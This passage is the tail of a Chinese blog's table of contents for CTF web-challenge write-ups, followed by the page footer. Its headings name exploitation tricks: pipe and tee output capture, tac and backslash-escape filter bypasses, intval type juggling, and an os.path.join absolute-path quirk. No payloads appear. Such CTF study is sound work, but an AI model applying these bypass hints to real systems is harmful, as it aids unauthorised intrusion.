+          基本结构为：command | tee file.txt</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%A0%E4%B8%BA%E9%A2%98%E7%9B%AE%E6%B2%A1%E8%BF%87%E6%BB%A4-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%A1%E9%81%93%E5%91%BD%E4%BB%A4%E7%AC%A6%E5%8F%B7%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%B0%86%E5%89%8D%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E4%BD%9C%E4%B8%BA%E5%90%8E%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%85%A5"><span class="toc-number">26.0.0.0.3.</span> <span class="toc-text">
+          因为题目没过滤 | , 这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%E8%BF%99%E5%8F%A5%E8%AF%9D%E7%9A%84%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E5%B0%86command%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E4%BD%9C%E4%B8%BAtee%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%85%A5%EF%BC%8Ctee%E5%91%BD%E4%BB%A4%E5%86%8D%E5%B0%86%E5%85%B6%E5%AD%98%E5%88%B0file-txt%E9%87%8C"><span class="toc-number">26.0.0.0.4.</span> <span class="toc-text">
+          那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file.txt里</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6-%E6%98%AF%E7%94%A8%E4%BA%8E%E5%9C%A8%E5%A4%96%E5%A3%B3%E7%A8%8B%E5%BA%8F%E4%B8%AD%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%EF%BC%8C%E4%BD%BF%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%88%90%E4%B8%BA%E5%AD%97%E9%9D%A2%E9%87%8F%EF%BC%8C%E8%80%8C%E5%A4%B1%E5%8E%BB%E5%85%B6%E5%9C%A8%E5%A4%96%E5%A3%B3%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%8E%A7%E5%88%B6%E7%AC%A6%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%88%E5%AE%98%E6%96%B9%E8%A7%A3%E9%87%8A%EF%BC%89"><span class="toc-number">26.0.0.0.5.</span> <span class="toc-text">
+          转义字符 \ 是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#tac%EF%BC%9Atac%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8A%9F%E8%83%BD%E6%98%AF%E7%94%A8%E4%BA%8E%E5%8F%8D%E5%90%91%E6%98%BE%E7%A4%BA%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%8D%B3%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%91%BD%E4%BB%A4cat%E7%9A%84%E5%8F%8D%E5%86%99%E5%BD%A2%E5%BC%8F"><span class="toc-number">26.0.0.0.6.</span> <span class="toc-text">
+          tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E4%B8%89%E3%80%81-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php"><span class="toc-number">27.</span> <span class="toc-text">
+          三十三、[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E5%9B%9B%E3%80%81-LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">28.</span> <span class="toc-text">
+          三十四、[LitCTF 2023]作业管理系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E4%BA%94%E3%80%81-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="toc-number">29.</span> <span class="toc-text">
+          三十五、[鹏城杯 2022]简单包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E5%85%AD%E3%80%81-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-websign"><span class="toc-number">30.</span> <span class="toc-text">
+          三十六、[UUCTF 2022 新生赛]websign</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E4%B8%83%E3%80%81-HDCTF-2023-Welcome-To-HDCTF-2023"><span class="toc-number">31.</span> <span class="toc-text">
+          三十七、[HDCTF 2023]Welcome To HDCTF 2023</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E5%85%AB%E3%80%81-NSSCTF-2022-Spring-Recruit-babyphp"><span class="toc-number">32.</span> <span class="toc-text">
+          三十八、[NSSCTF 2022 Spring Recruit]babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#intval-%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B4%E6%95%B0%E5%80%BC%EF%BC%8C%E5%B8%B8%E7%94%A8%E4%BA%8E%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="toc-number">32.0.0.0.1.</span> <span class="toc-text">
+          intval() 函数可以获取变量的整数值，常用于强制类型转换</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E4%B9%9D%E3%80%81-GDOUCTF-2023-EZ-WEB"><span class="toc-number">33.</span> <span class="toc-text">
+          三十九、[GDOUCTF 2023]EZ WEB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E3%80%81-GDOUCTF-2023-%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="toc-number">34.</span> <span class="toc-text">
+          四十、[GDOUCTF 2023]泄露的伪装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E4%B8%80%E3%80%81-HNCTF-2022-Week1-Interesting-include"><span class="toc-number">35.</span> <span class="toc-text">
+          四十一、[HNCTF 2022 Week1]Interesting_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E4%BA%8C%E3%80%81-NISACTF-2022-babyupload"><span class="toc-number">36.</span> <span class="toc-text">
+          四十二、[NISACTF 2022]babyupload</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%8B%BC%E6%8E%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">36.0.0.0.1.</span> <span class="toc-text">
+          绝对路径拼接漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#os-path-join-path-paths-%E5%87%BD%E6%95%B0%E7%94%A8%E4%BA%8E%E5%B0%86%E5%A4%9A%E4%B8%AA%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E8%BF%9E%E6%8E%A5%E6%88%90%E4%B8%80%E4%B8%AA%E7%BB%84%E5%90%88%E7%9A%84%E8%B7%AF%E5%BE%84%E3%80%82%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E9%80%9A%E5%B8%B8%E5%8C%85%E5%90%AB%E4%BA%86%E5%9F%BA%E7%A1%80%E8%B7%AF%E5%BE%84%EF%BC%8C%E8%80%8C%E4%B9%8B%E5%90%8E%E7%9A%84%E6%AF%8F%E4%B8%AA%E5%8F%82%E6%95%B0%E8%A2%AB%E5%BD%93%E4%BD%9C%E7%BB%84%E4%BB%B6%E6%8B%BC%E6%8E%A5%E5%88%B0%E5%9F%BA%E7%A1%80%E8%B7%AF%E5%BE%84%E4%B9%8B%E5%90%8E%E3%80%82"><span class="toc-number">36.0.0.0.2.</span> <span class="toc-text">
+          *os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%84%B6%E8%80%8C%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E6%9C%89%E4%B8%80%E4%B8%AA%E5%B0%91%E6%9C%89%E4%BA%BA%E7%9F%A5%E7%9A%84%E7%89%B9%E6%80%A7%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%8B%BC%E6%8E%A5%E7%9A%84%E6%9F%90%E4%B8%AA%E8%B7%AF%E5%BE%84%E4%BB%A5-%E5%BC%80%E5%A4%B4%EF%BC%8C%E9%82%A3%E4%B9%88%E5%8C%85%E6%8B%AC%E5%9F%BA%E7%A1%80%E8%B7%AF%E5%BE%84%E5%9C%A8%E5%86%85%E7%9A%84%E6%89%80%E6%9C%89%E5%89%8D%E7%BC%80%E8%B7%AF%E5%BE%84%E9%83%BD%E5%B0%86%E8%A2%AB%E5%88%A0%E9%99%A4%EF%BC%8C%E8%AF%A5%E8%B7%AF%E5%BE%84%E5%B0%86%E8%A7%86%E4%B8%BA%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">36.0.0.0.3.</span> <span class="toc-text">
+          然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E4%B8%89%E3%80%81-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">37.</span> <span class="toc-text">
+          四十三、[UUCTF 2022 新生赛]ez_rce</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#RCE%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%EF%BC%9Ahttps-zhuanlan-zhihu-com-p-391439312-utm-id-0"><span class="toc-number">37.0.0.0.1.</span> <span class="toc-text">
+          RCE各种绕过总结：https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;391439312?utm_id&#x3D;0</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E5%9B%9B%E3%80%81-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Ez-upload"><span class="toc-number">38.</span> <span class="toc-text">
+          四十四、[SWPUCTF 2022 新生赛]Ez_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E4%BA%94%E3%80%81-HNCTF-2022-Week1-easy-html"><span class="toc-number">39.</span> <span class="toc-text">
+          四十五、[HNCTF 2022 Week1]easy_html</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E5%85%AD%E3%80%81-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="toc-number">40.</span> <span class="toc-text">
+          四十六、[羊城杯 2020]easycon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E4%B8%83%E3%80%81-GDOUCTF-2023-%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-number">41.</span> <span class="toc-text">
+          四十七、[GDOUCTF 2023]受不了一点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E5%85%AB%E3%80%81-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5"><span class="toc-number">42.</span> <span class="toc-text">
+          四十八、[SWPUCTF 2022 新生赛]奇妙的MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%8D%81%E4%B9%9D%E3%80%81-HNCTF-2022-Week1-easy-upload"><span class="toc-number">43.</span> <span class="toc-text">
+          四十九、[HNCTF 2022 Week1]easy_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E3%80%81-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-1z-unserialize"><span class="toc-number">44.</span> <span class="toc-text">
+          五十、[SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E4%B8%80%E3%80%81-HNCTF-2022-Week1-What-is-Web"><span class="toc-number">45.</span> <span class="toc-text">
+          五十一、[HNCTF 2022 Week1]What is Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E4%BA%8C%E3%80%81-HNCTF-2022-Week1-Interesting-http"><span class="toc-number">46.</span> <span class="toc-text">
+          五十二、[HNCTF 2022 Week1]Interesting_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E4%B8%89%E3%80%81-%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-Middle-magic"><span class="toc-number">47.</span> <span class="toc-text">
+          五十三、[鹤城杯 2021]Middle magic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E5%9B%9B%E3%80%81-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-where-am-i"><span class="toc-number">48.</span> <span class="toc-text">
+          五十四、[SWPUCTF 2022 新生赛]where_am_i</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E4%BA%94%E3%80%81-FSCTF-2023-%E6%BA%90%E7%A0%81%EF%BC%81%E5%90%AF%E5%8A%A8"><span class="toc-number">49.</span> <span class="toc-text">
+          五十五、[FSCTF 2023]源码！启动!</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
